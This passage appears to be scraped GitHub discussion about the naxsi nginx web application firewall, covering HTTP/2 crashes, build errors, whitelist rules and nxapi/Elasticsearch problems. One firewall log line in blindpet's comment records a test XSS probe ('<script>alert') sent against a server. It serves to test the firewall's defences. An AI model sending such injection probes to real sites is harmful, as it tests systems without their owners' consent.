now.\nDoes anyone have more insights on the risks and implications of leaving that out from the core rules?. Hey @buixor, yeah, http2 branch and the latest nginx release.. Hi @marcelomd, yeah, I was just using the http2 branch without the suggested PR #309. @buixor It would be nice to have that merged in http2 since I have a job that builds nginx automatically from that branch.\nThanks for the patches!!. Beautiful! Thanks @buixor. After recompiling nginx with the http2 branch with the merge of PR #309 I confirm that all issues and segfaults are gone. I've restored the original core.rules with all the $HEADERS_VAR:Cookie and everything is smooth again.\nThanks everyone!!!!\n. Oops, sorry about that. I did search for a similar before submitting this one... but I did only on the open issues... my bad.\nThanks a lot!! ;)\n. This would be really appreaciated! :)\n. Hi @marcelomd, thanks for the quick feedback!\nI'm afraid #258 does not do what I'm suggesting to.\nWhat I'd need is basically a way to set how the logs generated by naxsi will be formatted.\n. Hi @buixor, sounds great!! \nJust wondering if it wouldn't be mutually better to not involve the Nginx logging format with this and just have a naxsi_log_forma directive with its variables set and keeping it logging the way it already is!!\nAs I mentioned before, I need the naxsi logs to use the $proxy_protocol_addr variable instead of the $remote_addr for the ip: field.\nJust my .2 cents.\nThanks!\n. Hi @buixor, sounds good!\nThanks!!\n. That's great info! Thanks for letting us know... Is there any bug open for this on Nginx?\n. @benkhlifafahmi Thanks a lot!! This looks great from my perspective. Are you going to submit a PR to have it in for the next release?\n. Hi @benkhlifafahmi, did you submit a PR? Looking forward for this enhancement! Thanks. @benkhlifafahmi Thanks for this PR! I'm looking forward for the release containing that piece of code.. Thanks @benkhlifafahmi, good to know it is stable and works. I'll just wait for 0.6 to come out, which I wish it comes sooner than later. \ud83d\ude03 . Ah... thanks!! Might be a good idea to have this piece of information on the docs! ;)\n. ",
    "fauno": "just two cents, http2 support in nginx is still buggy.  i had to disable\nit because it would stop serving sites altogether (just blank pages)\neven without naxsi.  then i read this:\nhttps://blog.crashed.org/fixing-nginx-bugs-with-nghttp2/\n\n:{\n. ",
    "combro2k": "@danlsgiga NGiNX wise no, not that I am aware of.\nNaxsi, i have no idea, the module itself can be added as dynamic module.\nIf I may suggest, use LibreSSL as openssl library... But thats what I did\n. @brunoqc true, most debian based distro's should have them\n. @marcelomd the stream module is used for proxying..if Im correct\nI may be mistaken.. https://nginx.org/en/docs/stream/ngx_stream_ssl_module.html\nI compiled a nginx with dynamic modules, without stream I can still use SSL..\n. @danlsgiga I have no idea, I compile nginx for debian based distro's..\nThere might be differences in versions dependencies for the files.. You can see them via ldd [filename.so]\nSo it might crash there..\n. @ManuelRighi \nLooks more like an issue of pagespeed... did you try to compile without naxsi?\nIf the problem presists, you need to contact pagespeed's developers.\nif the problem is gone, compile naxsi without pagespeed and see if that helps.. @ManuelRighi Maybe this is related? https://github.com/pagespeed/ngx_pagespeed/issues/1194\nDid you try to compile it against nginx mainline version?. ",
    "phun-ky": "What is the status of this? \n+1 for the good work here <3. ",
    "viktor-zhuromskyy": "nginx-upstream-fair module itself triggers segfault on 1.11.8+. ",
    "Louvremaster": "I have the same problem with nginx 1.10.3 + naxsi 0.55.3 when http2 is enabled.\nWill this be fixed?. ",
    "ManuelRighi": "Hello,\nI have same problem, nginx 1.10.3, naxsi 0.55.2 and http2 enabled :|. Thanks @marcelomd ... I try http2 branch ;). Hello, What exactly is the commands for download branch HTTP2 and merger of PR # 309 ?\nThanks. @gutweiler thanks ;). Hello,\nwith nginx 1.12.1, pagespeed 1.12.34.2-stable and naxsi with branch http2, I receive this error during compile:\nobjs/addon/src/ngx_url_async_fetcher.o:/opt/ngx_pagespeed-1.12.34.2-stable/src/ngx_url_async_fetcher.cc:89: first defined here\ncollect2: error: ld returned 1 exit status\nobjs/Makefile:382: recipe for target 'objs/nginx' failed\nmake[2]:  [objs/nginx] Error 1\nmake[2]: Leaving directory '/opt/nginx_source/nginx-1.12.1/debian/build-nginx'\nMakefile:8: recipe for target 'build' failed\nmake[1]:  [build] Error 2\nmake[1]: Leaving directory '/opt/nginx_source/nginx-1.12.1/debian/build-nginx'\ndebian/rules:50: recipe for target 'build-arch.nginx' failed\nmake: *** [build-arch.nginx] Error 2\ndpkg-buildpackage: error: debian/rules build gave error exit status 2\nIf I use branch master, no problem, but I have issue with http2 ..... I need to merge http2 on master ?\nThanks. @combro2k nginx + pagespeed without naxsi compile is ok\n. Hello,\nIf I reverse the module order, compile works :). If I compile with this ./configure order\n--add-module=/opt/ngx_pagespeed-1.12.34.2-stable --add-module=/opt/naxsi-0.55.3/naxsi_src\ncompile fails. If I reverse order,\n--add-module=/opt/naxsi-0.55.3/naxsi_src --add-module=/opt/ngx_pagespeed-1.12.34.2-stable\ncompile works. Hello,\nnginx 1.10.3 with naxsi 0.55.3 is affected by this bug ?\nIf yes, If I checkout http2 branch for naxsi, the naxsi version is still the 0.55.3 ?\nThanks. ",
    "gutweiler": "@buixor No problem at all with http2 branch plus MR #309, would be nice to have it in master. \ud83d\udc4d . @ManuelRighi \nIt would be:\ngit clone https://github.com/nbs-system/naxsi.git && \\\ncd naxsi && \\\ngit checkout http2 && \\\ngit fetch origin pull/309/head:http2-309 && \\\ngit checkout http2-309 && \\\nBut meanwhile #309 is merged into http2 branch. -> you can just checkout the http2 branch.. ",
    "msrv": "EDIT: Solved it myself, error was caused by compiling as dynamic module. When using naxsi as static module, the http2 version works with the latest nginx version again. \nThe issue was fixed before by compiling nginx from the http2 branch. But with the nginx release \n1.13.6 nginx will not start even if using the http2 branch of nginx.\nAny ideas?\n. ",
    "lewismarshall": ":+1:  I get the same with the following data:\nMy Elasticsearch setup:\ndocker run -d --name es_thing  -p 9200:9200 quay.io/ukhomeofficedigital/elasticsearch:v0.1.1\ncurl -XPUT 'http://192.168.99.100:9200/nxapi/'\n{\"acknowledged\":true}\nRun tool:\n```\n./nxtool.py -x --colors -c nxapi.json --files=../../proxy.logs\nsize :1000\nWhitelist(ing) ratio :\nTop servers :\nTop URI(s) :\nTop Zone(s) :\nTop Peer(s) :\n```\nLog Data:\ngrep NAXSI_FMT ../../proxy.logs\n2015/10/20 15:34:23 [error] 19#0: *90 NAXSI_FMT: ip=10.10.67.1&server=fdcs-acceptance.notprod.homeoffice.gov.uk&uri=/documents/uploads&learning=0&vers=0.54&total_processed=39&total_blocked=1&block=1&zone0=BODY&id0=2&var_name0=, client: 10.10.67.1, server: proxy, request: \"POST /documents/uploads?_csrf=04868dbb-de6d-4bcf-afb3-8162dbea8a5a HTTP/1.1\", host: \"fdcs-acceptance.notprod.homeoffice.gov.uk\", referrer: \"https://fdcs-acceptance.notprod.homeoffice.gov.uk/documents\"\n2015/10/20 15:34:27 [error] 19#0: *91 NAXSI_FMT: ip=10.10.67.1&server=fdcs-acceptance.notprod.homeoffice.gov.uk&uri=/documents/uploads&learning=0&vers=0.54&total_processed=50&total_blocked=2&block=1&zone0=BODY&id0=2&var_name0=, client: 10.10.67.1, server: proxy, request: \"POST /documents/uploads?_csrf=04868dbb-de6d-4bcf-afb3-8162dbea8a5a HTTP/1.1\", host: \"fdcs-acceptance.notprod.homeoffice.gov.uk\", referrer: \"https://fdcs-acceptance.notprod.homeoffice.gov.uk/documents\"\n2015/10/20 15:39:23 [error] 19#0: *534 NAXSI_FMT: ip=10.10.67.1&server=fdcs-acceptance.notprod.homeoffice.gov.uk&uri=/documents/uploads&learning=0&vers=0.54&total_processed=444&total_blocked=3&block=1&zone0=BODY&id0=2&var_name0=, client: 10.10.67.1, server: proxy, request: \"POST /documents/uploads?_csrf=e7ce6f9c-425e-40e5-b92b-b80f4b5915ab HTTP/1.1\", host: \"fdcs-acceptance.notprod.homeoffice.gov.uk\", referrer: \"https://fdcs-acceptance.notprod.homeoffice.gov.uk/documents\"\n2015/10/20 15:39:27 [error] 19#0: *534 NAXSI_FMT: ip=10.10.67.1&server=fdcs-acceptance.notprod.homeoffice.gov.uk&uri=/documents/uploads&learning=0&vers=0.54&total_processed=455&total_blocked=4&block=1&zone0=BODY&id0=2&var_name0=, client: 10.10.67.1, server: proxy, request: \"POST /documents/uploads?_csrf=e7ce6f9c-425e-40e5-b92b-b80f4b5915ab HTTP/1.1\", host: \"fdcs-acceptance.notprod.homeoffice.gov.uk\", referrer: \"https://fdcs-acceptance.notprod.homeoffice.gov.uk/documents\"\nThe version of NGINX etc. is built here:\nhttps://github.com/UKHomeOffice/docker-ngx-openresty/blob/master/build.sh\nBut the NAXSI version is from here:\nhttps://github.com/nbs-system/naxsi/archive/master.zip\nBe good to find out more...\n. ",
    "blindpet": "@orright yours looks like it's not in learning mode since it says learningmode=0\nMine looks like this but it still isn't working\n2015/10/24 14:43:55 [error] 25837#25837: *2 NAXSI_FMT: ip=192.168.60.1&server=192.168.60.135&uri=/xss.php<script>alert('attacked')</script>&learning=1&vers=0.54&total_processed=16&total_blocked=14&block=1&cscore0=$SQL&score0=16&cscore1=$XSS&score1=64&zone0=URL&id0=1010&var_name0=&zone1=URL&id1=1011&var_name1=&zone2=URL&id2=1013&var_name2=&zone3=URL&id3=1302&var_name3=&zone4=URL&id4=1303&var_name4=, client: 192.168.60.1, server: default, request: \"GET /xss.php%3Cscript%3Ealert('attacked')%3C/script%3E HTTP/1.1\", host: \"192.168.60.135\"\nChecking returns blankness\n```\npython nxtool.py -c ./nxapi.json  -x --colors\nsize :1000\nWhitelist(ing) ratio :\nTop servers :\nTop URI(s) :\nTop Zone(s) :\nTop Peer(s) :\n```\nI am on Debian 8 x64, elastic search is 1.71 from repo and nginx-naxsi is 1.80 from the dotdeb repository\n. ",
    "orright": "In both cases, I tried, or not\n. @AnoopAlias \nFinally solved?\n. @AnoopAlias \nthanks a lot \uff01\uff01\uff01\n. ",
    "thomasjpatterson": "No problem and yeah it's bad when they just straight drop compatibility. It was going so smoothly then when I went to start whitelisting it went bad. For the time being I just dropped down to es1.x to continue working.\n. ",
    "calumah": "Hi, almost same error with elasticsearch 2.1 :\n```\n./nxtool.py -c nxapi.json -x\nsize :1000\nWhitelist(ing) ratio :\nTraceback (most recent call last):\n  File \"./nxtool.py\", line 253, in \n    translate.fetch_top(cfg.cfg[\"global_filters\"], \"whitelisted\", limit=2)\n  File \"/root/naxsi/nxapi/nxapi/nxtransform.py\", line 529, in fetch_top\n    res = self.search(esq)\n  File \"/root/naxsi/nxapi/nxapi/nxtransform.py\", line 560, in search\n    x = self.es.search(index=self.cfg[\"elastic\"][\"index\"], doc_type=self.cfg[\"elastic\"][\"doctype\"], body=esq)\n  File \"/usr/local/lib/python2.7/dist-packages/elasticsearch/client/utils.py\", line 69, in _wrapped\n    return func(args, params=params, *kwargs)\n  File \"/usr/local/lib/python2.7/dist-packages/elasticsearch/client/init.py\", line 530, in search\n    doc_type, '_search'), params=params, body=body)\n  File \"/usr/local/lib/python2.7/dist-packages/elasticsearch/transport.py\", line 307, in perform_request\n    status, headers, data = connection.perform_request(method, url, params, body, ignore=ignore, timeout=timeout)\n  File \"/usr/local/lib/python2.7/dist-packages/elasticsearch/connection/http_urllib3.py\", line 93, in perform_request\n    self._raise_error(response.status, raw_data)\n  File \"/usr/local/lib/python2.7/dist-packages/elasticsearch/connection/base.py\", line 105, in _raise_error\n    raise HTTP_EXCEPTIONS.get(status_code, TransportError)(status_code, error_message, additional_info)\nelasticsearch.exceptions.RequestError: TransportError(400, u'search_phase_execution_exception')\n```\n. ",
    "jltignon": "Hi,\nWith ES 2.X facets have been deprecated and replaced by aggregations. Not sure it's the best way to do that but here's a patch for nxtransform.py (v0.54) to support aggregations :\n``` patch\n528c528\n<         esq['facets'] =  { \"facet_results\" : {\"terms\": { \"field\": field, \"size\" : self.es_max_size} }}\n\n\n    esq['aggregations'] =  { \"agg1\" : {\"terms\": { \"field\": field, \"size\" : self.es_max_size} }}\n\n530c530,531\n<         total = res['facets']['facet_results']['total']\n\n\n\n    #total = res['aggregations']['agg1']['buckets'][0]['doc_count']\n    total = res['hits']['total']\n\n532,533c533,534\n<         for x in res['facets']['facet_results']['terms']:\n<             print \"# \"+self.grn.format(x['term'])+\" \"+str(round( (float(x['count']) / total) * 100.0, 2))+\" % (total:\"+str(x['count'])+\"/\"+str(total)+\")\"\n\n\n\n    for x in res['aggregations']['agg1']['buckets']:\n        print \"# \"+self.grn.format(x['key'])+\" \"+str(round( (float(x['doc_count']) / total) * 100.0, 2))+\" % (total:\"+str(x['doc_count'])+\"/\"+str(total)+\")\"\n\n542c543\n<         esq['facets'] =  { \"facet_results\" : {\"terms\": { \"field\": key, \"size\" : 50000} }}\n\n\n\n    esq['aggregations'] =  { \"agg1\" : {\"terms\": { \"field\": key, \"size\" : 50000} }}\n\n544,546c545,547\n<         for x in res['facets']['facet_results']['terms']:\n<             if x['term'] not in uniques:\n<                 uniques.append(x['term'])\n\n\n\n    for x in res['aggregations']['agg1']['buckets']:\n        if x['key'] not in uniques:\n            uniques.append(x['key'])\n\n```\n\nHope this can help\n. Hi buixor,\nI'm just a french FreeBSD naxsi fan. Used mod_security for a long time, even in positive mode with mod_profiler help and was searching for... naxsi. Thanks and keep on the good work. \n. ",
    "aarvee11": "Works perfectly with the patch provided! You can go ahead and merge this!\n. Can you share some sample logs?. pip install elasticsearch This shall fix the issue. nxtool has a dependency on the python elasticsearch library. PCRE Regex works. So generate a regex for all your usernames. http://regexr.com/ is your friend. ",
    "mrbaiwei": "I've set the whitelist for id:1007 ,but access to be blocked\nMainRule\uff1a \"str:attack\" \"msg:ddos\" \"mz:ARGS|BODY\" \"s:$SQL:8\" id:1007;\nBasicRule\uff1awl:1007;\ndebug info\uff1a\n2015/12/28 14:09:06 [debug] 14757#0: 4924 is rule [1007] whitelisted in zone ARGS for item attack\n2015/12/28 14:09:06 [debug] 14757#0: 4924 extra: exception happened in |NAME\n2015/12/28 14:09:06 [debug] 14757#0: 4924 rule 1007 is disabled somewhere\n2015/12/28 14:09:06 [debug] 14757#0: 4924 hashing varname [attack]\n2015/12/28 14:09:06 [debug] 14757#0: 4924 hashing varname attack - 'wl:X_VAR:attack'\n2015/12/28 14:09:06 [debug] 14757#0: 4924 hashing varname attack - 'wl:X_VAR:attack|NAME'\n2015/12/28 14:09:06 [debug] 14757#0: 4924 hashing uri#1 / ($URL:X|URI)\n2015/12/28 14:09:06 [debug] 14757#0: 4924 hashing uri#3 #/ ($URL:X|ZONE|NAME)\n2015/12/28 14:09:06 [debug] 14757#0: 4924 hashing MIX #/#attack or ($URL:x|$X_VAR:y|NAME)\n2015/12/28 14:09:06 [error] 14757#0: 4924 NAXSI_FMT: ip=1.1.1.1&server=www.x.com&uri=/&learning=0&vers=0.54&total_processed=726&total_blocked=10&block=1&cscore0=$SQL&score0=8&zone0=ARGS|NAME&id0=1007&var_name0=attack, client: 1.1.1.1, server: localhost, request: \"HEAD /?attack=1 HTTP/1.0\", host: \"www. x.com\"\n. cat site.rules\nLearningMode; #Enables learning mode\nSecRulesEnabled;\nSecRulesDisabled;\nDeniedUrl \"/RequestDenied\";\ncheck rules\nCheckRule \"$SQL >= 8\" BLOCK;\nBasicRule wl:1007;\ncat naxsi_core.rules\nMainRule \"str:attack\" \"msg:ddos\" \"mz:ARGS|BODY\" \"s:$SQL:8\" id:1007;\ntest url:\nhttp://s-241185.gotocdn.com/?attack=1\n. ok\uff0cthank you\uff01\n. i don't set whitelist and I did not set the id to 10 and 16 the main rule\nbut errorlog display id: 10,16 appear to be matching interception\n. test for a long time,must add NAME,like\nBasicRule wl:1000 \"mz:$URL:/admin.php|ARGS|NAME\";\n. ",
    "sm0k": "Ok, you're right, it an hardcoded limitation of nginx. The only way to extend the 2048 char limit is to recompile Nginx... Will follow another path.\nThank you!\n. ",
    "lookingcloudy": "Not sure if this is in the current build...I just downloaded and compiled this a couple weeks ago.  I'm getting infinite loop when tagging.  After a few minutes I exited...here is the stack:\n```\nTagged 0 events out of 1\nTagged 0 events out of 1\nTagged 0 events out of 1\nTagged 0 events out of 1\nTagged 0 events out of 1\nTagged 0 events out of 1\nTagged 0 events out of 1\n^CTraceback (most recent call last):\n  File \"./nxtool.py\", line 233, in \n    x = translate.tag_events(esq, \"Whitelisted\", tag=options.tag)\n  File \"/usr/src/nginx/naxsi-0.55rc1/nxapi/nxapi/nxtransform.py\", line 655, in tag_events\n    res = self.search(esq)\n  File \"/usr/src/nginx/naxsi-0.55rc1/nxapi/nxapi/nxtransform.py\", line 619, in search\n    x = self.es.search(index=self.cfg[\"elastic\"][\"index\"], doc_type=self.cfg[\"elastic\"][\"doctype\"], body=esq)\n  File \"/usr/local/lib/python2.7/dist-packages/elasticsearch/client/utils.py\", line 69, in _wrapped\n    return func(*args, params=params, kwargs)\n  File \"/usr/local/lib/python2.7/dist-packages/elasticsearch/client/init.py\", line 548, in search\n    doc_type, '_search'), params=params, body=body)\n  File \"/usr/local/lib/python2.7/dist-packages/elasticsearch/transport.py\", line 329, in perform_request\n    status, headers, data = connection.perform_request(method, url, params, body, ignore=ignore, timeout=timeout)\n  File \"/usr/local/lib/python2.7/dist-packages/elasticsearch/connection/http_urllib3.py\", line 94, in perform_request\n    response = self.pool.urlopen(method, url, body, retries=False, headers=self.headers, kw)\n  File \"/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py\", line 578, in urlopen\n    chunked=chunked)\n  File \"/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py\", line 385, in _make_request\n    httplib_response = conn.getresponse(buffering=True)\n  File \"/usr/lib/python2.7/httplib.py\", line 1051, in getresponse\n    response.begin()\n  File \"/usr/lib/python2.7/httplib.py\", line 415, in begin\n    version, status, reason = self._read_status()\n  File \"/usr/lib/python2.7/httplib.py\", line 371, in _read_status\n    line = self.fp.readline(_MAXLINE + 1)\n  File \"/usr/lib/python2.7/socket.py\", line 476, in readline\n    data = self._sock.recv(self._rbufsize)\nKeyboardInterrupt\n```\n. Thanks - that's the version I am running.   I added this snippet of code to nxtransform.py and seemed to resolve the problem...a bit of a hack.  This loop was in an endless cycle.  There seemed to be a condition where there were records found to update in elasticsearch, but for some reason were not being updated.  I didn't have to time to track down why.\nJust a gut feeling, this may be related to having a low value for \"max_size\" in the configuration file.  I originally had this at 1000.  I bumped up to 10000 and didn't notice the ENDLESS LOOP any longer...or perhaps I didn't hit whatever the triggering condition was.\n``` python\n647         total_events = int(str(x[\"hits\"][\"total\"]))\n648         print str(self.grn.format(total_events)) + \" items to be tagged ...\"\n649         size = int(x['hits']['total'])\n650         if size > 100:\n651             size = size / 10\n652         prevcount = -1\n653         while count < total_events:\n654             if count == prevcount:\n655                 print \"ENTERED ENDLESS LOOP - BREAKING OUT\"\n656                 break\n657             else:\n658                 prevcount = count\n```\n. ",
    "sbagmeijer": "Sorry for the late reply! thank you for adding the support :+1: !\n. ",
    "HackersZone": "You Can't Load Naxsi as a Dynamic Mod... . Not Yet !. ",
    "xavier777": "Hi Buixor,\nNoPhear wrote this issue on my recommandations : \nhttps://github.com/nbs-system/naxsi/issues/251\nI want bypass BasicRule wl:2\nwhen you say : Please provide a way to reproduce your error.\nWhat do you need ?\nThanks by advance,\nXavier\n. ",
    "yurilaaziz": "yes it's work fine with adding a trailing slash\nproxy_pass http://172.24.1.31:80/;\ncan we log the GET and POST vars of the blocked request ? \n. ",
    "aiwilliams": "@buixor Please, feel free to patch it. I hope it makes your life easier and not harder :blush: \n. To clarify, I am using nxapi and I have a lot of data where the name/value is swapped. Looking at the actual log data (before loading it into Elasticsearch), I see that the name/value are swapped. The data that is correct is in lines where naxsi would have blocked if I were not in LearningMode.\n. @buixor Seems you are correct! Thanks for your response.\n<187>Mar 30 14:57:26 myserver.com nginx: 2016/03/30 14:57:26 [error] 7853#0: *53 NAXSI_EXLOG: ip=11.11.11.11&server=myserver.com&uri=/something.json&id=1000&zone=ARGS|NAME&var_name=somewhere&content=from, client: 11.11.11.11, server: myserver.com, request: \"GET /something.json?from=somewhere HTTP/1.1\", host: \"myserver.com\"\nThat is generated from this request:\ncurl https://myserver.com/something.json?from=somewhere\n- zone=ARGS|NAME\n- var_name=somewhere\n- content=from\nThe from variable name violates rule 1000.\n. ",
    "tonychee7000": "well, but i was using CentOS 6.x on our site of my company, so i have to make it compatable with our system\n. ",
    "michaelstephenson": "what version of ubuntu are you using?\n. ",
    "dcalixto": "@michaelstephenson , i'm using 14.04 trusty.\n. thak you very much @blotus. that's it, just one doubt naxsi work with openssl? may i really have to install zlib?\n. right, thank you!\n. so, should be?\nBasicRule wl:1000 \"mz:$URL_X:regexp:/|$BODY_VAR:_method\";. Hello @buixor \nso that's is the properly way?\nBasicRule wl:1000 \"mz:$URL_X:regexp:/|$BODY_VAR:regex:_method\";\n. ",
    "hobochili": "~~After reviewing the code for the naxsi_unescape_uri function, I realize my question is silly. We're gonna have to either escape the %'s or whitelist id:10.~~\n. Actually I think this might be a bug in Naxsi. As far as I can determine, %'s do not need to be escaped between the boundaries of a multipart/form-data POST.\nIn Naxsi, ngx_http_dummy_multipart_parse relies on naxsi_unescape_uri to check for null bytes, but naxsi_unescape_uri has some strict rules about the presence of %'s which are causing requests like the one above to be blocked.\n. If this issue is deemed working as intended, I would endorse a solution for #142 (whitelisting based on the value of an argument). In the present state, my only option is to effectively disable id:10 by whitelisting it in mz:BODY across the board. This is undesirable but apparently necessary unless you have any suggestions. \nFor instance, the %TAG% strings appear in emails being sent from our system. I would like to be able to whitelist id:10 on mz BODY whenever the value of argument a is sendEmail. Is there any way to accomplish this?\n. There was a previous issue with event insertion when the GeoIP python module is absent from the system (#207). Does it work with the GeoIP module installed?\n. ",
    "markussackmann": "You could have an optional variable in naxsi_core.rules which defines the delimiter.\n. And why is the rule counted twice if it has a match?\n2016/05/11 13:07:51 [debug] 21109#0: *402376 is rule [3201] whitelisted in zone ARGS for item ^foo.*\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing varname [^foo.*]\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing varname [^foo.*] (rule:3201) - 'wl:X_VAR:^foo.*'\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing varname [^foo.*] (rule:3201) - 'wl:X_VAR:^foo.*|NAME'\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing uri#1 [/] (rule:3201) ($URL:X|URI)\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing uri#3 [#/] (rule:3201) ($URL:X|ZONE|NAME)\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing MIX [/#^foo.*] ($URL:x|$X_VAR:y) or ($URL:x|$X_VAR:y|NAME)\n2016/05/11 13:07:51 [error] 21109#0: *402376 NAXSI_EXLOG: ip=212.51.138.250&server=localhost&uri=/&id=3201&zone=ARGS&var_name=^foo.*&content=bar, client: 212.51.138.250, server: localhost, request: \"GET /?^foo.*=bar HTTP/1.1\", host: \"localhost\"\n2016/05/11 13:07:51 [debug] 21109#0: *402376 is rule [3201] whitelisted in zone ARGS for item ^foo.*\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing varname [^foo.*]\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing varname [^foo.*] (rule:3201) - 'wl:X_VAR:^foo.*'\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing varname [^foo.*] (rule:3201) - 'wl:X_VAR:^foo.*|NAME'\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing uri#1 [/] (rule:3201) ($URL:X|URI)\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing uri#3 [#/] (rule:3201) ($URL:X|ZONE|NAME)\n2016/05/11 13:07:51 [debug] 21109#0: *402376 hashing MIX [/#^foo.*] ($URL:x|$X_VAR:y) or ($URL:x|$X_VAR:y|NAME)\n2016/05/11 13:07:51 [error] 21109#0: *402376 NAXSI_EXLOG: ip=212.51.138.250&server=localhost&uri=/&id=3201&zone=ARGS&var_name=^foo.*&content=bar, client: 212.51.138.250, server: localhost, request: \"GET /?^foo.*=bar HTTP/1.1\", host: \"localhost\"\n2016/05/11 13:07:51 [error] 21109#0: *402376 NAXSI_FMT: ip=212.51.138.250&server=localhost&uri=/&learning=1&vers=0.55rc1&total_processed=4&total_blocked=1&block=1&cscore0=$OH&score0=16&zone0=ARGS&id0=3201&var_name0=^foo.*&zone1=ARGS&id1=3201&var_name1=^foo.*, client: 212.51.138.250, server: localhost, request: \"GET /?^foo.*=bar HTTP/1.1\", host: \"localhost\"\n. Hi,\nI can confirm that it works. Thank you very much!\nThe rule however is still counted twice. As soon as the matchzone is defined with $ARGS_VAR or $ARGS_VAR_X the output of NAXSI_EXLOG appears two times.\nBut if you think this finding is cosmetic you might close the ticket :-)\n. That's great! Just had to test my rules with the additional $URL_X :-) Perfectly works and counts. \n. Hi,\nId 1015 is just an example. There is no match to any rule on a url with only a single slash.\nThis gets a hit:\nhttp://localhost/index.htm?foo=bar,foo\nThis doesn't get a hit:\nhttp://localhost/?foo=bar,foo\nTalking about tree improved-blacklist-matchzones. Version 0.55rc1 works correctly.\n. Must be something with my configuration. After installing original naxsi_core.rules everything works as expected. Sorry for wasting your time.\n. ",
    "mikhail-yarosh": "Still same trouble with adding data. Warning about GeoIP missing now cleared.\n. ./nxtool.py -c test.json --files=nginx.log\nsize :1000\nWARNING:root:List of files :['nginx.log']\nlog open\nWARNING:root:Malformed/incomplete event [no zone]\n{'date': '2016-05-04T13:50:16+03', 'events': []}\nWARNING:root:Malformed/incomplete event [no zone]\n{'date': '2016-05-04T13:52:16+03', 'events': []}\nWARNING:root:Malformed/incomplete event [no zone]\n{'date': '2016-05-04T13:52:41+03', 'events': []}\nWARNING:root:Malformed/incomplete event [no zone]\n{'date': '2016-05-04T13:53:09+03', 'events': []}\nWARNING:root:Malformed/incomplete event [no zone]\n{'date': '2016-05-04T13:59:17+03', 'events': []}\nWARNING:root:Malformed/incomplete event [no zone]\n{'date': '2016-05-04T14:06:31+03', 'events': []}\nWARNING:root:Malformed/incomplete event [no zone]\n{'date': '2016-05-04T14:10:12+03', 'events': []}\n. Sorry guys, i found issue in configuration: # inlude _core rules; in /etc/nginx/nginx.conf.\nSo sad...\n. ",
    "codecov-io": "Current coverage is 73.00%\n\nMerging #282 into master will increase coverage by 2.12%\n\ndiff\n@@             master       #282   diff @@\n==========================================\n  Files             6          6          \n  Lines          1854       1811    -43   \n  Methods           0          0          \n  Messages          0          0          \n  Branches        704        665    -39   \n==========================================\n+ Hits           1314       1322     +8   \n+ Misses          179        155    -24   \n+ Partials        361        334    -27\n\nPowered by Codecov. Last updated by 5ab2309...f5d2d37\n. ## Current coverage is 90.43% (diff: 100%)\nMerging #309 into http2 will increase coverage by 0.02%\n\ndiff\n@@              http2       #309   diff @@\n==========================================\n  Files             6          6          \n  Lines          1856       1851     -5   \n  Methods           0          0          \n  Messages          0          0          \n  Branches        704        699     -5   \n==========================================\n- Hits           1678       1674     -4   \n+ Misses          178        177     -1   \n  Partials          0          0\n\nPowered by Codecov. Last update 21bca28...d9ec746\n. \n",
    "RobDana": "Thank You @blotus This was indeed the issue. I had installed the 'latest' with apt-get on Ubuntu 14 and find that it's not 'the latest'\n. ",
    "coveralls": "\nCoverage increased (+1.03%) to 92.914% when pulling ba277147fa597c6c2aa014bc4de4131ecbe8f3d8 on dead_code into fef0fbe1e3d968cf62a1ad0f9643787e4bb7f7a1 on master.\n. \nCoverage remained the same at 92.914% when pulling 016557b6dca1ae52bcc5dccde45fd916b4c91bd1 on config into cf254ec518c89d4349ada244117af6c17edcdf57 on master.\n. ",
    "prithamgit": "2016/06/27 15:51:23 [error] 2787#2787: *355 NAXSI_FMT: seed_end=605&zone49=BODY|NAME&id49=1311&var_name49=ubermenu_general[scrollto_duration]&zone50=BODY|NAME&id50=1310&var_name50=ubermenu_general[collapse_after_scroll]&zone51=BODY|NAME&id51=1311&var_name51=ubermenu_general[collapse_after_scroll]&zone52=BODY|NAME&id52=1310&var_name52=ubermenu_general[collapse_after_scroll]&zone53=BODY|NAME&id53=1311&var_name53=ubermenu_general[collapse_after_scroll]&zone54=BODY|NAME&id54=1310&var_name54=ubermenu_general[remove_conflicts]&zone55=BODY|NAME&id55=1311&var_name55=ubermenu_general[remove_conflicts]&zone56=BODY|NAME&id56=1310&var_name56=ubermenu_general[remove_conflicts]&zone57=BODY|NAME&id57=1311&var_name57=ubermenu_general[remove_conflicts]&zone58=BODY|NAME&id58=1310&var_name58=ubermenu_general[autocomplete_max_term_results]&zone59=BODY|NAME&id59=1311&var_name59=ubermenu_general[autocomplete_max_term_results]&zone60=BODY|NAME&id60=1310&var_name60=ubermenu_general[autocomplete_max_post_results]&zone61=BODY|NAME&id61=1311&var_name61=ubermenu_general[autocomplete_max_post_results]&zone62=BODY|NAME&id62=1310&var_name62=ubermenu_general[autocomplete_disable]&zone63=BODY|NAME&id63=1311&var_name63=ubermenu_general[autocomplete_disable]&zone64=BODY|NAME&id64=1310&var_name64=ubermenu_general[dynamic_authors_disable]&zone65=BODY|NAME&id65=1311&var_name65=ubermenu_general[dynamic_authors_disable]&zone66=BODY|NAME&id66=1310&var_name66=ubermenu_general[admin_notices]&zone67=BODY|NAME&id67=1311&var_name67=ubermenu_general[admin_notices]&zone68=BODY|NAME&id68=1310&var_name68=ubermenu_general[admin_notices]&zone69=BODY|NAME&id69=1311&var_name69=ubermenu_general[admin_notices]&zone70=BODY|NAME&id70=1310&var_name70=ubermenu_general[accessible]&zone71=BODY|NAME&id71=1311&var_name71=ubermenu_general[accessible]&zone72=BODY|NAME&id72=1310&var_name72=ubermenu_general[accessible]&zone73=BODY|NAME&id73=1311&var_name73=ubermenu_general[accessible]&seed_start=714, client: 10.0.0.2, server: www.zk.in, request: \"POST /wp-admin/options.php HTTP/\n2016/06/27 15:51:23 [error] 2787#2787: *355 NAXSI_FMT: 